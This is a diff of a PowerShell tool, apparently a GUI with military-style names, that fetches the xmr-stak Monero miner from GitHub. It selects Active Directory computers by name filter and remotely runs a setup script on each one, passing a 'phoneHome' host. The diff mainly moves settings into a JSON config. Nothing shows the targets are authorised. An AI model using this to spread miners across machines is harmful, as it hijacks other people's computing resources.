@@ -11,10 +11,10 @@ function payload () {
 
   # Get xmr-stak from github.
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
-  $cache = "${psscriptroot}\ops_cache"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
   $stakName = $missionParameters.stakName
   $stakVersion = $missionParameters.stakVersion
+  $cache = $missionParameters.cache
 
   $version = $stakVersion
   $name = $stakName + "-" + $version + ".zip"
@@ -34,9 +34,9 @@ function redist () {
 
   # Get Visual C++ Redistributable
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
-  $cache = "${psscriptroot}\ops_cache"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
   $distName = $missionParameters.distName
+  $cache = $missionParameters.cache
 
   $name = $distName
   $link = "https://aka.ms/vs/15/release/"
@@ -55,7 +55,9 @@ function configTpl () { #change to point at ops cache and rename function
 
   # Get config template from github
 
-  $cache = "${psscriptroot}\ops_cache"
+  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
+  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
+  $cache = $missionParameters.cache
   $name = "config.tpl"
   $link = "https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/"
   $payloadURI = "$link" + "$name"
@@ -72,7 +74,9 @@ function configTpl () { #change to point at ops cache and rename function
 function poolTpl () { #change to point at ops cache and rename function
 
   # Get pool template from github
-  $cache = "${psscriptroot}\ops_cache"
+  $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
+  $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
+  $cache = $missionParameters.cache
   $name = "pools.tpl"
   $link = "https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/"
 
@@ -90,9 +94,8 @@ function poolTpl () { #change to point at ops cache and rename function
 function ammoDump ($outputPane,$progressBar) {
 
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
-  $cache = "${psscriptroot}\ops_cache"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
-
+  $cache = $missionParameters.cache
   $stakName = $missionParameters.stakName
   $stakVersion = $missionParameters.stakVersion
   $distName = $missionParameters.distName
@@ -133,18 +136,25 @@ function ammoDump ($outputPane,$progressBar) {
   $outputPane.text += "`nAmmo Dump Established!"
 }
 
-function fireBase ($outputPane,$progressBar) {c
+function fireBase ($outputPane,$progressBar) {
 
   #check for $ops_cache directory and call ammoDump if it doesn't
 
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
   $opsDir = $missionParameters.ops
-  $filterTarget = $missionParameters.Target
-  $advanceParty = $missionParameters.ap
+  $filterTarget = $missionParameters.target
+  $advanceParty = $missionParameters.advanceParty
+  $phoneHome = $missionParameters.phoneHome
+  $cache = $missionParameters.cache
+  $distName = $missionParameters.distName
+  $stakName = $missionParameters.stakName
+  $stakVersion = $missionParameters.stakVersion
   $searchbase = $missionParameters.search
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
   showFireBase $outputPane
+
+  
 
   foreach ($client in $hostList.Name)
 
@@ -154,7 +164,7 @@ function fireBase ($outputPane,$progressBar) {c
     [int]$Percentage = ($counter / $hostList.count) * 100
     $ProgressBar.Value = $Percentage
     $outputPane.text += "Advance Party en-route to $client...`n"
-    $cmdstring = "invoke-command -computername $client -FilePath $advanceParty -ArgumentList $opsDir"
+    $cmdstring = "invoke-command -computername $client -FilePath $advanceParty -ArgumentList $opsDir, $cache, $phoneHome, $distName, $stakName, $stakVersion"
     $scriptblock = [scriptblock]::Create($cmdstring)
     Start-Process powershell -ArgumentList "-command $Scriptblock"
 
@@ -169,7 +179,7 @@ function fireMission ($outputPane,$progressBar) {
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
   $searchbase = $missionParameters.search
-  $filterTarget = $missionParameters.Target
+  $filterTarget = $missionParameters.target
   $opsDir = $missionParameters.ops
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
   showFireMission $outputPane
@@ -196,7 +206,7 @@ function ceaseFire ($outputPane,$progressBar) {
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
   $searchbase = $missionParameters.search
-  $filterTarget = $missionParameters.Target
+  $filterTarget = $missionParameters.target
   #$opsDir = $missionParameters.ops
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
   showCeaseFire $outputPane
@@ -223,7 +233,7 @@ function cycleGunline ($outputPane,$progressBar) {
 
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
-  $filterTarget = $missionParameters.Target
+  $filterTarget = $missionParameters.target
   $searchbase = $missionParameters.search
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
   showCycleGunline $outputPane
@@ -254,14 +264,14 @@ function getGrid ($outputPane) {
   $outputPane.text += $missionParameters.search.Name
   $outputPane.text += "`n`nSearch Base(s): "
   $outputPane.text += $missionParameters.search.distinguishedname
-  $outputPane.text += "`n`nTarget Filter String: "
-  $outputPane.text += $missionParameters.Target
+  $outputPane.text += "`n`ntarget Filter String: "
+  $outputPane.text += $missionParameters.target
   $outputPane.text += "`n`nOperations Directory: "
   $outputPane.text += $missionParameters.ops
   $outputPane.text += "`n`nPayload: "
   $outputPane.text += $missionParameters.payload
   $outputPane.text += "`n`nAdvance Party: "
-  $outputPane.text += $missionParameters.ap
+  $outputPane.text += $missionParameters.advanceParty
 
 }
 
@@ -271,19 +281,21 @@ function setGrid ($outputPane,$textBox_filter,$textBox_OpsDir) {
   $opsDir = $textBox_OpsDir.text
   $configPath = "${psscriptroot}\fireDirectionalControl.json"
   $advanceParty = "${psscriptroot}\advanceParty.ps1"
+  $cache = "${psscriptroot}\ops_cache"
   $headQuarters = hostname
   $storedSettings = @{
 
-    ops = $opsDir
-    payload = $opsDir
-    ap = $advanceParty
-    Target = $filterTarget
-    search = $searchBase
-    stakVersion = $stakVersion
     stakName = $stakName
+    stakVersion = $stakVersion
     distName = $distName
     phoneHome = $headQuarters
-
+    search = $searchBase
+    target = $filterTarget
+    cache = $cache
+    ops = $opsDir
+    payload = $opsDir
+    advanceParty = $advanceParty
+    
   }
   $storedSettings | ConvertTo-Json | Out-File $configPath
   showRedLeg $outputPane
@@ -330,7 +342,7 @@ function moveOut ($outputPane,$progressBar) {
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
   $searchbase = $missionParameters.search
-  $filterTarget = $missionParameters.Target
+  $filterTarget = $missionParameters.target
   $opsDir = $missionParameters.ops
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
   showMoveOut $outputPane
@@ -357,7 +369,7 @@ function cpuCheck ($outputPane) {
 
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
-  $filterTarget = $missionParameters.Target
+  $filterTarget = $missionParameters.target
   $searchbase = $missionParameters.search
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
 
@@ -389,7 +401,7 @@ function gpuCheck ($outputPane) {
 
   $fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
   $missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
-  $filterTarget = $missionParameters.Target
+  $filterTarget = $missionParameters.target
   $searchbase = $missionParameters.search
   $hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
 
